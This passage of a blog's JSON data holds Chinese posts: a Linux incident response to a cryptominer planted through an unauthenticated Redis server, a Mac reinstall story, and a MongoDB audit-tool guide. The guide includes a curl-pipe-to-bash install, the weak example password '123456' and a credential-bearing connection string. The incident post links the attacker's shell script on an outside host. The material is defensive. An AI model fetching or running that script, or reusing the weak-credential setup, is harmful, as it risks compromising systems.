的服務状态\n-p //显示建立相关链接的程序名\n-r //显示路由信息,路由表\n-e //显示扩展信息,例如uid等\n-s //按各个协议进行统计\n-c //每隔一个固定时间,执行该netstat命令\n\n常用:\nnetstat -lut //显示处于监听状态的tcp、udp端口\nnetstat -lutp //带有PID显示网络件监听情况\nnetstat -tpln //带有IP显示网络监听情况\nnetstat -tulpan -c 3 //每3秒打印监听情况到屏幕上\n\n#### 显示文件详情\n\n3.stat\n参数:(文件&目录信息)\n(备:此命令可查看一些恶意程序会替换系统内命令如:wget、curl等具有下载功能)\n-l //以ls -lT格式输出(文件权限、所属用户等信息)\n其他参数基本不用即可获取文件&目录详细信息.","slug":"Linux应急示例","published":1,"updated":"2020-10-23T03:36:24.952Z","_id":"ckglobhdk000ab1hq1wna2n3d","comments":1,"layout":"post","photos":[],"link":"","content":"<p>🤦‍♂公司某测试服对外的Redis被黑导致被植入挖矿程序(kdevtmpfsi),所以就想着整理一份简单的Linux应急学习学习.</p>\n<p><img src=\"/images/yj/gj.png\"></p>\n<center>图:ECS告警</center>\n\n<h3 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h3><p>ECS告警(如上图所示)某测试服,短信和控制台中提醒存在恶意程序(备注:上图只是存在恶意下载源,并不是真实恶意程序告警).因此赶紧进行应急处置(这里说下,告警要比应急早半天甚至一天时间,太滞后一定第一时间处置);原因是Redis对外服务未设置密码导致被攻击.</p>\n<h3 id=\"实施\"><a href=\"#实施\" class=\"headerlink\" title=\"实施\"></a>实施</h3><h4 id=\"1-进程分析并kill\"><a href=\"#1-进程分析并kill\" class=\"headerlink\" title=\"1.进程分析并kill\"></a>1.进程分析并kill</h4><p>进程分析:可结合ECS告警获取父进程路径及命令详细信息,再进行ps获取具体进程及守护进程信息;这里主要确定病毒主程序对应PID.</p>\n<p><img src=\"/images/yj/rm.png\"></p>\n<center>图:清理记录</center>\n\n<h4 id=\"2-ClamAV扫描\"><a href=\"#2-ClamAV扫描\" class=\"headerlink\" title=\"2.ClamAV扫描\"></a>2.ClamAV扫描</h4><p>因以上清理是另一同事清理,后又收到短信提醒说存在恶意进程信息(可能未清理完),干脆进行病毒扫描看下.</p>\n<p>工具使用参数介绍</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;askubuntu.com&#x2F;questions&#x2F;250290&#x2F;how-do-i-scan-for-viruses-with-clamav</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/yj/av.png\"></p>\n<center>图:ClamAV执行</center>\n\n<p><img src=\"/images/yj/av1.png\"></p>\n<center>图:扫描结果</center>\n\n<h4 id=\"3-在线监测\"><a href=\"#3-在线监测\" class=\"headerlink\" title=\"3.在线监测\"></a>3.在线监测</h4><p><img src=\"/images/yj/jc.png\"></p>\n<center>图:检测结果</center>\n\n<h4 id=\"4-清理\"><a href=\"#4-清理\" class=\"headerlink\" title=\"4.清理\"></a>4.清理</h4><p>定位恶意文件并清理内部其他恶意文件(red2.so、root这部分其实可对比新安装的Redis服务可快速判断恶意程序),以上检测是事后进行在线检测,第一时间先进行移除到本地留存.</p>\n<p><img src=\"/images/yj/redis.png\"></p>\n<center>图:定位</center>\n\n<p><img src=\"/images/yj/redis1.png\"></p>\n<center>图:root文件内容</center>\n\n<h4 id=\"5-shell\"><a href=\"#5-shell\" class=\"headerlink\" title=\"5.shell\"></a>5.shell</h4><p>根据root这个二进制文件提示下载地址下载shell分析可能存在系统部分命令替换、redis计划任务等信息.具体 <a href=\"http://www.si1ent.xyz/ziliao/shell.txt\">点击这里</a></p>\n<p><img src=\"/images/yj/shell.png\"></p>\n<h4 id=\"6-计划任务清理\"><a href=\"#6-计划任务清理\" class=\"headerlink\" title=\"6.计划任务清理\"></a>6.计划任务清理</h4><p><img src=\"/images/yj/cron.png\"></p>\n<center>图:Redis计划任务(ECS告警下载恶意源,目测服务已停)</center>\n\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上是简单的挖矿病毒的清理,其实在进行应急时自然先确定告警事件类型(挖矿、勒索、挂马等),这样有助后面进行的一系列的应急实施.</p>\n<p>加固建议的话也可自行网上搜索也可参考如下:</p>\n<p>1、Redis禁止对外提供服务(配置文件修改并进行reload)</p>\n<p>2、清理计划任务crontab -r(不同账户下可能存在不同的计划任务／var/spool/cron/)</p>\n<p>3、更换一系列密码以防存在ssh免密登陆(从shell中得知重新写入key).</p>\n<p>4、命令可参考如下.</p>\n<h3 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h3><h4 id=\"进程分析基础命令\"><a href=\"#进程分析基础命令\" class=\"headerlink\" title=\"进程分析基础命令\"></a>进程分析基础命令</h4><p>1.ps<br>参数:(进程分析)<br>-a //显示所有终端机下执行的进程<br>-u //以用户为主的格式来显示进程状况<br>-x //显示所有进程,不以终端机来区分<br>-e //此参数的效果和指定”A”参数相同<br>-f //显示UID,PPIP,C与STIME栏位</p>\n<p>常用:<br>ps -aux<br>ps -ef</p>\n<h4 id=\"网络监听\"><a href=\"#网络监听\" class=\"headerlink\" title=\"网络监听\"></a>网络监听</h4><p>2.netstat<br>参数:(网络监听)<br>-a //(all)显示所有选项,默认不显示LISTEN相关<br>-t //(tcp)仅显示tcp相关选项<br>-u //(udp)仅显示udp相关选项<br>-n //拒绝显示别名,能显示数字的全部转化成数字(IP会直接显示)<br>-l //仅列出有在Listen (监听) 的服務状态<br>-p //显示建立相关链接的程序名<br>-r //显示路由信息,路由表<br>-e //显示扩展信息,例如uid等<br>-s //按各个协议进行统计<br>-c //每隔一个固定时间,执行该netstat命令</p>\n<p>常用:<br>netstat -lut //显示处于监听状态的tcp、udp端口<br>netstat -lutp //带有PID显示网络件监听情况<br>netstat -tpln //带有IP显示网络监听情况<br>netstat -tulpan -c 3 //每3秒打印监听情况到屏幕上</p>\n<h4 id=\"显示文件详情\"><a href=\"#显示文件详情\" class=\"headerlink\" title=\"显示文件详情\"></a>显示文件详情</h4><p>3.stat<br>参数:(文件&amp;目录信息)<br>(备:此命令可查看一些恶意程序会替换系统内命令如:wget、curl等具有下载功能)<br>-l //以ls -lT格式输出(文件权限、所属用户等信息)<br>其他参数基本不用即可获取文件&amp;目录详细信息.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>🤦‍♂公司某测试服对外的Redis被黑导致被植入挖矿程序(kdevtmpfsi),所以就想着整理一份简单的Linux应急学习学习.</p>\n<p><img src=\"/images/yj/gj.png\"></p>\n<center>图:ECS告警</center>\n\n<h3 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h3><p>ECS告警(如上图所示)某测试服,短信和控制台中提醒存在恶意程序(备注:上图只是存在恶意下载源,并不是真实恶意程序告警).因此赶紧进行应急处置(这里说下,告警要比应急早半天甚至一天时间,太滞后一定第一时间处置);原因是Redis对外服务未设置密码导致被攻击.</p>\n<h3 id=\"实施\"><a href=\"#实施\" class=\"headerlink\" title=\"实施\"></a>实施</h3><h4 id=\"1-进程分析并kill\"><a href=\"#1-进程分析并kill\" class=\"headerlink\" title=\"1.进程分析并kill\"></a>1.进程分析并kill</h4><p>进程分析:可结合ECS告警获取父进程路径及命令详细信息,再进行ps获取具体进程及守护进程信息;这里主要确定病毒主程序对应PID.</p>\n<p><img src=\"/images/yj/rm.png\"></p>\n<center>图:清理记录</center>\n\n<h4 id=\"2-ClamAV扫描\"><a href=\"#2-ClamAV扫描\" class=\"headerlink\" title=\"2.ClamAV扫描\"></a>2.ClamAV扫描</h4><p>因以上清理是另一同事清理,后又收到短信提醒说存在恶意进程信息(可能未清理完),干脆进行病毒扫描看下.</p>\n<p>工具使用参数介绍</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;askubuntu.com&#x2F;questions&#x2F;250290&#x2F;how-do-i-scan-for-viruses-with-clamav</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/yj/av.png\"></p>\n<center>图:ClamAV执行</center>\n\n<p><img src=\"/images/yj/av1.png\"></p>\n<center>图:扫描结果</center>\n\n<h4 id=\"3-在线监测\"><a href=\"#3-在线监测\" class=\"headerlink\" title=\"3.在线监测\"></a>3.在线监测</h4><p><img src=\"/images/yj/jc.png\"></p>\n<center>图:检测结果</center>\n\n<h4 id=\"4-清理\"><a href=\"#4-清理\" class=\"headerlink\" title=\"4.清理\"></a>4.清理</h4><p>定位恶意文件并清理内部其他恶意文件(red2.so、root这部分其实可对比新安装的Redis服务可快速判断恶意程序),以上检测是事后进行在线检测,第一时间先进行移除到本地留存.</p>\n<p><img src=\"/images/yj/redis.png\"></p>\n<center>图:定位</center>\n\n<p><img src=\"/images/yj/redis1.png\"></p>\n<center>图:root文件内容</center>\n\n<h4 id=\"5-shell\"><a href=\"#5-shell\" class=\"headerlink\" title=\"5.shell\"></a>5.shell</h4><p>根据root这个二进制文件提示下载地址下载shell分析可能存在系统部分命令替换、redis计划任务等信息.具体 <a href=\"http://www.si1ent.xyz/ziliao/shell.txt\">点击这里</a></p>\n<p><img src=\"/images/yj/shell.png\"></p>\n<h4 id=\"6-计划任务清理\"><a href=\"#6-计划任务清理\" class=\"headerlink\" title=\"6.计划任务清理\"></a>6.计划任务清理</h4><p><img src=\"/images/yj/cron.png\"></p>\n<center>图:Redis计划任务(ECS告警下载恶意源,目测服务已停)</center>\n\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上是简单的挖矿病毒的清理,其实在进行应急时自然先确定告警事件类型(挖矿、勒索、挂马等),这样有助后面进行的一系列的应急实施.</p>\n<p>加固建议的话也可自行网上搜索也可参考如下:</p>\n<p>1、Redis禁止对外提供服务(配置文件修改并进行reload)</p>\n<p>2、清理计划任务crontab -r(不同账户下可能存在不同的计划任务／var/spool/cron/)</p>\n<p>3、更换一系列密码以防存在ssh免密登陆(从shell中得知重新写入key).</p>\n<p>4、命令可参考如下.</p>\n<h3 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h3><h4 id=\"进程分析基础命令\"><a href=\"#进程分析基础命令\" class=\"headerlink\" title=\"进程分析基础命令\"></a>进程分析基础命令</h4><p>1.ps<br>参数:(进程分析)<br>-a //显示所有终端机下执行的进程<br>-u //以用户为主的格式来显示进程状况<br>-x //显示所有进程,不以终端机来区分<br>-e //此参数的效果和指定”A”参数相同<br>-f //显示UID,PPIP,C与STIME栏位</p>\n<p>常用:<br>ps -aux<br>ps -ef</p>\n<h4 id=\"网络监听\"><a href=\"#网络监听\" class=\"headerlink\" title=\"网络监听\"></a>网络监听</h4><p>2.netstat<br>参数:(网络监听)<br>-a //(all)显示所有选项,默认不显示LISTEN相关<br>-t //(tcp)仅显示tcp相关选项<br>-u //(udp)仅显示udp相关选项<br>-n //拒绝显示别名,能显示数字的全部转化成数字(IP会直接显示)<br>-l //仅列出有在Listen (监听) 的服務状态<br>-p //显示建立相关链接的程序名<br>-r //显示路由信息,路由表<br>-e //显示扩展信息,例如uid等<br>-s //按各个协议进行统计<br>-c //每隔一个固定时间,执行该netstat命令</p>\n<p>常用:<br>netstat -lut //显示处于监听状态的tcp、udp端口<br>netstat -lutp //带有PID显示网络件监听情况<br>netstat -tpln //带有IP显示网络监听情况<br>netstat -tulpan -c 3 //每3秒打印监听情况到屏幕上</p>\n<h4 id=\"显示文件详情\"><a href=\"#显示文件详情\" class=\"headerlink\" title=\"显示文件详情\"></a>显示文件详情</h4><p>3.stat<br>参数:(文件&amp;目录信息)<br>(备:此命令可查看一些恶意程序会替换系统内命令如:wget、curl等具有下载功能)<br>-l //以ls -lT格式输出(文件权限、所属用户等信息)<br>其他参数基本不用即可获取文件&amp;目录详细信息.</p>\n"},{"title":"Mac系统修复及反馈","date":"2020-08-20T08:57:27.000Z","_content":"![image-20200820210051583](/images/mac/image-20200820210051583.png)\n\n#### 原因\n\n​\t\t因周末线上考试需Win系统，之前想虚拟机环境下配置，但不曾想软件检测虚拟机环境无法安装运行。无奈只能想装个双系统进行(其实家里还有一台Win的笔记本)；索性就周末安装个；装好后检测驱动，结果因摄像头驱动问题，无法安装。哎，只能删了Win的启动Boot Camp；卸载、清理后。重启发现第一进入的还是Win系统；但因系统清理后是无法进入系统的。\n\n​\t\t但，开机按着Option还是可以选择Mac的对应磁盘；此时也就没多想就正常运，未关机、重启等操作了。\n\n​\t\t周一上班测试NTFS工具时，发现有个磁盘信息，想着以为是因为这个原因导致存在Win系统未清干净，就直接抹掉；刚好下午临近下班时公司停电，可能因只是关闭了显示器，未锁屏，电脑没电了；带回家开机发现电脑还是一直启动首选Win的。无论如何操作都无法启动。\n\n#### 修复\n\n关于修复，确实网上找了很多资料，也问了好几个朋友，但基本都尝试了还是未果。主要尝试以下两种方式：\n\n1、使用网络恢复，尝试急救找到Boot Camp启动项，但无奈执行多次还是无法在Option选项后查看对应启动磁盘。\n\n2、就是网上很相似的，因磁盘的GUID冲突导致硬件无法检测到Mac OS磁盘的信息；通过制作PE尝试进入系统后修改GUID形式来解决。[原文](https://blog.csdn.net/c402820553/article/details/75168280)\n\n![image-20200820212030238](/images/mac/image-20200820212030238.png)\n\n#### 失败\n\n​\t\t以上方式均无法解决，因工作需要现在摆在面前只有系统重装，这样最为快速，只是系统内之前的所有环境均不复存在了。\n\n#### 重装\n\n​\t无奈，无法修复只能系统重装了。\n\n​\t制作系统盘很简答，只需找一个8G以上U盘，找到对应版本的Mac  OS系统镜像即可（这里我用的一直是10.12.6的）。\n\n​\tWin系统上安装对应写磁盘和制作的软件**transmac**这类软件使用网上都有，包括系统重装类教程都有。\n\n​\t制作完后，U盘插上Mac进行Option选择，此时选择U盘；进入后找到磁盘工具对之前磁盘进行数据抹掉。选择安装指定磁盘即可，安装、配置完成时间大概在30分钟左右。\n\n ![image-20200820220348339](/images/mac/image-20200820220348339.png)\n\n​\t剩下就是各类软件的安装部分了。按需安装即可。\n\n#### 总结\n\n1. 真的不建议大家进行双系统安装、及时安装，在进行清理时，一定要注意！一定要注意！\n\n2. 数据及时备份真的很重要，及时系统部分环境需重新配置，但是数据的重要性真的不能比拟。**一定要进行数据备份！！！**\n\n3. 关于部分文档如果实力允许，建议部分文档或密码类软件找一些具有云同步实力的购买。真的很实用。\n\n4. 其实Mac本身也有个Time Machine的备份工具，直接找个足够空间的磁盘专门进行定时备份，及时后期系统崩溃或误删，也可以直接通过网络恢复处，选择这种方式进行数据恢复即可。\n\n5. 很幸运的是，之前购买了一块SSD用来数据备份，还好基本数据都还在。只是系统的环境需要重新配置了。也习惯了记笔记的习惯了；很多环境重新配置都记录了，后期可以分享分享了。😄\n\n\n​\t\t\t\t\t\t\t\t\t\t<center>数据清理须谨慎、一失足成千古悔！</center>\n\n​\t","source":"_posts/Mac系统修复及反思.md","raw":"---\ntitle: Mac系统修复及反馈\ndate: 2020-8-20 16:57:27\ntags:\n - Mac\n---\n![image-20200820210051583](/images/mac/image-20200820210051583.png)\n\n#### 原因\n\n​\t\t因周末线上考试需Win系统，之前想虚拟机环境下配置，但不曾想软件检测虚拟机环境无法安装运行。无奈只能想装个双系统进行(其实家里还有一台Win的笔记本)；索性就周末安装个；装好后检测驱动，结果因摄像头驱动问题，无法安装。哎，只能删了Win的启动Boot Camp；卸载、清理后。重启发现第一进入的还是Win系统；但因系统清理后是无法进入系统的。\n\n​\t\t但，开机按着Option还是可以选择Mac的对应磁盘；此时也就没多想就正常运，未关机、重启等操作了。\n\n​\t\t周一上班测试NTFS工具时，发现有个磁盘信息，想着以为是因为这个原因导致存在Win系统未清干净，就直接抹掉；刚好下午临近下班时公司停电，可能因只是关闭了显示器，未锁屏，电脑没电了；带回家开机发现电脑还是一直启动首选Win的。无论如何操作都无法启动。\n\n#### 修复\n\n关于修复，确实网上找了很多资料，也问了好几个朋友，但基本都尝试了还是未果。主要尝试以下两种方式：\n\n1、使用网络恢复，尝试急救找到Boot Camp启动项，但无奈执行多次还是无法在Option选项后查看对应启动磁盘。\n\n2、就是网上很相似的，因磁盘的GUID冲突导致硬件无法检测到Mac OS磁盘的信息；通过制作PE尝试进入系统后修改GUID形式来解决。[原文](https://blog.csdn.net/c402820553/article/details/75168280)\n\n![image-20200820212030238](/images/mac/image-20200820212030238.png)\n\n#### 失败\n\n​\t\t以上方式均无法解决，因工作需要现在摆在面前只有系统重装，这样最为快速，只是系统内之前的所有环境均不复存在了。\n\n#### 重装\n\n​\t无奈，无法修复只能系统重装了。\n\n​\t制作系统盘很简答，只需找一个8G以上U盘，找到对应版本的Mac  OS系统镜像即可（这里我用的一直是10.12.6的）。\n\n​\tWin系统上安装对应写磁盘和制作的软件**transmac**这类软件使用网上都有，包括系统重装类教程都有。\n\n​\t制作完后，U盘插上Mac进行Option选择，此时选择U盘；进入后找到磁盘工具对之前磁盘进行数据抹掉。选择安装指定磁盘即可，安装、配置完成时间大概在30分钟左右。\n\n ![image-20200820220348339](/images/mac/image-20200820220348339.png)\n\n​\t剩下就是各类软件的安装部分了。按需安装即可。\n\n#### 总结\n\n1. 真的不建议大家进行双系统安装、及时安装，在进行清理时，一定要注意！一定要注意！\n\n2. 数据及时备份真的很重要，及时系统部分环境需重新配置，但是数据的重要性真的不能比拟。**一定要进行数据备份！！！**\n\n3. 关于部分文档如果实力允许，建议部分文档或密码类软件找一些具有云同步实力的购买。真的很实用。\n\n4. 其实Mac本身也有个Time Machine的备份工具，直接找个足够空间的磁盘专门进行定时备份，及时后期系统崩溃或误删，也可以直接通过网络恢复处，选择这种方式进行数据恢复即可。\n\n5. 很幸运的是，之前购买了一块SSD用来数据备份，还好基本数据都还在。只是系统的环境需要重新配置了。也习惯了记笔记的习惯了；很多环境重新配置都记录了，后期可以分享分享了。😄\n\n\n​\t\t\t\t\t\t\t\t\t\t<center>数据清理须谨慎、一失足成千古悔！</center>\n\n​\t","slug":"Mac系统修复及反思","published":1,"updated":"2020-10-23T03:19:43.999Z","_id":"ckglobhdl000bb1hq9pn7bwor","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src=\"/images/mac/image-20200820210051583.png\" alt=\"image-20200820210051583\"></p>\n<h4 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h4><p>​        因周末线上考试需Win系统，之前想虚拟机环境下配置，但不曾想软件检测虚拟机环境无法安装运行。无奈只能想装个双系统进行(其实家里还有一台Win的笔记本)；索性就周末安装个；装好后检测驱动，结果因摄像头驱动问题，无法安装。哎，只能删了Win的启动Boot Camp；卸载、清理后。重启发现第一进入的还是Win系统；但因系统清理后是无法进入系统的。</p>\n<p>​        但，开机按着Option还是可以选择Mac的对应磁盘；此时也就没多想就正常运，未关机、重启等操作了。</p>\n<p>​        周一上班测试NTFS工具时，发现有个磁盘信息，想着以为是因为这个原因导致存在Win系统未清干净，就直接抹掉；刚好下午临近下班时公司停电，可能因只是关闭了显示器，未锁屏，电脑没电了；带回家开机发现电脑还是一直启动首选Win的。无论如何操作都无法启动。</p>\n<h4 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h4><p>关于修复，确实网上找了很多资料，也问了好几个朋友，但基本都尝试了还是未果。主要尝试以下两种方式：</p>\n<p>1、使用网络恢复，尝试急救找到Boot Camp启动项，但无奈执行多次还是无法在Option选项后查看对应启动磁盘。</p>\n<p>2、就是网上很相似的，因磁盘的GUID冲突导致硬件无法检测到Mac OS磁盘的信息；通过制作PE尝试进入系统后修改GUID形式来解决。<a href=\"https://blog.csdn.net/c402820553/article/details/75168280\">原文</a></p>\n<p><img src=\"/images/mac/image-20200820212030238.png\" alt=\"image-20200820212030238\"></p>\n<h4 id=\"失败\"><a href=\"#失败\" class=\"headerlink\" title=\"失败\"></a>失败</h4><p>​        以上方式均无法解决，因工作需要现在摆在面前只有系统重装，这样最为快速，只是系统内之前的所有环境均不复存在了。</p>\n<h4 id=\"重装\"><a href=\"#重装\" class=\"headerlink\" title=\"重装\"></a>重装</h4><p>​    无奈，无法修复只能系统重装了。</p>\n<p>​    制作系统盘很简答，只需找一个8G以上U盘，找到对应版本的Mac  OS系统镜像即可（这里我用的一直是10.12.6的）。</p>\n<p>​    Win系统上安装对应写磁盘和制作的软件<strong>transmac</strong>这类软件使用网上都有，包括系统重装类教程都有。</p>\n<p>​    制作完后，U盘插上Mac进行Option选择，此时选择U盘；进入后找到磁盘工具对之前磁盘进行数据抹掉。选择安装指定磁盘即可，安装、配置完成时间大概在30分钟左右。</p>\n<p> <img src=\"/images/mac/image-20200820220348339.png\" alt=\"image-20200820220348339\"></p>\n<p>​    剩下就是各类软件的安装部分了。按需安装即可。</p>\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><ol>\n<li><p>真的不建议大家进行双系统安装、及时安装，在进行清理时，一定要注意！一定要注意！</p>\n</li>\n<li><p>数据及时备份真的很重要，及时系统部分环境需重新配置，但是数据的重要性真的不能比拟。<strong>一定要进行数据备份！！！</strong></p>\n</li>\n<li><p>关于部分文档如果实力允许，建议部分文档或密码类软件找一些具有云同步实力的购买。真的很实用。</p>\n</li>\n<li><p>其实Mac本身也有个Time Machine的备份工具，直接找个足够空间的磁盘专门进行定时备份，及时后期系统崩溃或误删，也可以直接通过网络恢复处，选择这种方式进行数据恢复即可。</p>\n</li>\n<li><p>很幸运的是，之前购买了一块SSD用来数据备份，还好基本数据都还在。只是系统的环境需要重新配置了。也习惯了记笔记的习惯了；很多环境重新配置都记录了，后期可以分享分享了。😄</p>\n</li>\n</ol>\n<p>​                                        <center>数据清理须谨慎、一失足成千古悔！</center></p>\n<p>​    </p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/images/mac/image-20200820210051583.png\" alt=\"image-20200820210051583\"></p>\n<h4 id=\"原因\"><a href=\"#原因\" class=\"headerlink\" title=\"原因\"></a>原因</h4><p>​        因周末线上考试需Win系统，之前想虚拟机环境下配置，但不曾想软件检测虚拟机环境无法安装运行。无奈只能想装个双系统进行(其实家里还有一台Win的笔记本)；索性就周末安装个；装好后检测驱动，结果因摄像头驱动问题，无法安装。哎，只能删了Win的启动Boot Camp；卸载、清理后。重启发现第一进入的还是Win系统；但因系统清理后是无法进入系统的。</p>\n<p>​        但，开机按着Option还是可以选择Mac的对应磁盘；此时也就没多想就正常运，未关机、重启等操作了。</p>\n<p>​        周一上班测试NTFS工具时，发现有个磁盘信息，想着以为是因为这个原因导致存在Win系统未清干净，就直接抹掉；刚好下午临近下班时公司停电，可能因只是关闭了显示器，未锁屏，电脑没电了；带回家开机发现电脑还是一直启动首选Win的。无论如何操作都无法启动。</p>\n<h4 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h4><p>关于修复，确实网上找了很多资料，也问了好几个朋友，但基本都尝试了还是未果。主要尝试以下两种方式：</p>\n<p>1、使用网络恢复，尝试急救找到Boot Camp启动项，但无奈执行多次还是无法在Option选项后查看对应启动磁盘。</p>\n<p>2、就是网上很相似的，因磁盘的GUID冲突导致硬件无法检测到Mac OS磁盘的信息；通过制作PE尝试进入系统后修改GUID形式来解决。<a href=\"https://blog.csdn.net/c402820553/article/details/75168280\">原文</a></p>\n<p><img src=\"/images/mac/image-20200820212030238.png\" alt=\"image-20200820212030238\"></p>\n<h4 id=\"失败\"><a href=\"#失败\" class=\"headerlink\" title=\"失败\"></a>失败</h4><p>​        以上方式均无法解决，因工作需要现在摆在面前只有系统重装，这样最为快速，只是系统内之前的所有环境均不复存在了。</p>\n<h4 id=\"重装\"><a href=\"#重装\" class=\"headerlink\" title=\"重装\"></a>重装</h4><p>​    无奈，无法修复只能系统重装了。</p>\n<p>​    制作系统盘很简答，只需找一个8G以上U盘，找到对应版本的Mac  OS系统镜像即可（这里我用的一直是10.12.6的）。</p>\n<p>​    Win系统上安装对应写磁盘和制作的软件<strong>transmac</strong>这类软件使用网上都有，包括系统重装类教程都有。</p>\n<p>​    制作完后，U盘插上Mac进行Option选择，此时选择U盘；进入后找到磁盘工具对之前磁盘进行数据抹掉。选择安装指定磁盘即可，安装、配置完成时间大概在30分钟左右。</p>\n<p> <img src=\"/images/mac/image-20200820220348339.png\" alt=\"image-20200820220348339\"></p>\n<p>​    剩下就是各类软件的安装部分了。按需安装即可。</p>\n<h4 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h4><ol>\n<li><p>真的不建议大家进行双系统安装、及时安装，在进行清理时，一定要注意！一定要注意！</p>\n</li>\n<li><p>数据及时备份真的很重要，及时系统部分环境需重新配置，但是数据的重要性真的不能比拟。<strong>一定要进行数据备份！！！</strong></p>\n</li>\n<li><p>关于部分文档如果实力允许，建议部分文档或密码类软件找一些具有云同步实力的购买。真的很实用。</p>\n</li>\n<li><p>其实Mac本身也有个Time Machine的备份工具，直接找个足够空间的磁盘专门进行定时备份，及时后期系统崩溃或误删，也可以直接通过网络恢复处，选择这种方式进行数据恢复即可。</p>\n</li>\n<li><p>很幸运的是，之前购买了一块SSD用来数据备份，还好基本数据都还在。只是系统的环境需要重新配置了。也习惯了记笔记的习惯了；很多环境重新配置都记录了，后期可以分享分享了。😄</p>\n</li>\n</ol>\n<p>​                                        <center>数据清理须谨慎、一失足成千古悔！</center></p>\n<p>​    </p>\n"},{"title":"MongoDB审计工具","date":"2020-10-14T08:57:27.000Z","_content":"\n#### 概述\n\n强大的 MongoDB 审计和渗透性测试（pentesting）工具。用于审计 MongoDB 服务器，检测不良安全设置和执行自动渗透测试。\n\nMongonDB配置安全检查工具\n\n```\nhttps://github.com/stampery/mongoaudit\n```\n\n#### Install\n\n```shell\npip install mongoaudit\n或如下安装\ncurl -s https://mongoaud.it/install | bash\n```\n\n![image-20200929211504801](/images/mongodb/image-20200929211504801.png)\n\n#### Docker install mongodb\n\n```shell\n# 拉取镜像\ndocker pull mongo\n# 运行并授权访问mongodb\ndocker run -itd --name mongo -p 27017:27017 mongo --auth\ndocker exec -it mongo mongo admin\n# 创建一个名为 admin，密码为 123456 的用户。\n> db.createUser({ user:'admin',pwd:'123456',roles:[ { role:'userAdminAnyDatabase', db: 'admin'},\"readWriteAnyDatabase\"]});\n# 设置密码\n> db.auth('admin', '123456')\n```\n\n#### 使用\n\n1、安装无报错即可执行“`mongoaudit`”\n\n![image-20200930103553876](/images/mongodb/image-20200930103553876.png)\n\n2、点击“OK，I'll be careful”\n\n![image-20200930111959162](/images/mongodb/image-20200930111959162.png)\n\n<center>Mongoaudit scan types</center>\n3、输入域名信息\n\n![image-20200930112054225](/images/mongodb/image-20200930112054225.png)\n\n4、输入域名及密码进行安全检查\n\n```shell\nmongodb://admin:123456@192.168.3.77:27017/database\n```\n\n![image-20200930115800598](/images/mongodb/image-20200930115800598.png)\n\n5、检查结果\n\n![image-20200930115946711](/images/mongodb/image-20200930115946711.png)\n","source":"_posts/MongoDB审计工具.md","raw":"---\ntitle: MongoDB审计工具\ndate: 2020-10-14 16:57:27\ntags:\n - MongoDB\n---\n\n#### 概述\n\n强大的 MongoDB 审计和渗透性测试（pentesting）工具。用于审计 MongoDB 服务器，检测不良安全设置和执行自动渗透测试。\n\nMongonDB配置安全检查工具\n\n```\nhttps://github.com/stampery/mongoaudit\n```\n\n#### Install\n\n```shell\npip install mongoaudit\n或如下安装\ncurl -s https://mongoaud.it/install | bash\n```\n\n![image-20200929211504801](/images/mongodb/image-20200929211504801.png)\n\n#### Docker install mongodb\n\n```shell\n# 拉取镜像\ndocker pull mongo\n# 运行并授权访问mongodb\ndocker run -itd --name mongo -p 27017:27017 mongo --auth\ndocker exec -it mongo mongo admin\n# 创建一个名为 admin，密码为 123456 的用户。\n> db.createUser({ user:'admin',pwd:'123456',roles:[ { role:'userAdminAnyDatabase', db: 'admin'},\"readWriteAnyDatabase\"]});\n# 设置密码\n> db.auth('admin', '123456')\n```\n\n#### 使用\n\n1、安装无报错即可执行“`mongoaudit`”\n\n![image-20200930103553876](/images/mongodb/image-20200930103553876.png)\n\n2、点击“OK，I'll be careful”\n\n![image-20200930111959162](/images/mongodb/image-20200930111959162.png)\n\n<center>Mongoaudit scan types</center>\n3、输入域名信息\n\n![image-20200930112054225](/images/mongodb/image-20200930112054225.png)\n\n4、输入域名及密码进行安全检查\n\n```shell\nmongodb://admin:123456@192.168.3.77:27017/database\n```\n\n![image-20200930115800598](/images/mongodb/image-20200930115800598.png)\n\n5、检查结果\n\n![image-20200930115946711](/images/mongodb/image-20200930115946711.png)\n","slug":"MongoDB审计工具","published":1,"updated":"2020-10-23T03:48:36.335Z","_id":"ckglobhdl000cb1hq6m9catc7","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h4><p>强大的 MongoDB 审计和渗透性测试（pentesting）工具。用于审计 MongoDB 服务器，检测不良安全设置和执行自动渗透测试。</p>\n<p>MongonDB配置安全检查工具</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;github.com&#x2F;stampery&#x2F;mongoaudit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Install\"><a href=\"#Install\" class=\"headerlink\" title=\"Install\"></a>Install</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install mongoaudit</span><br><span 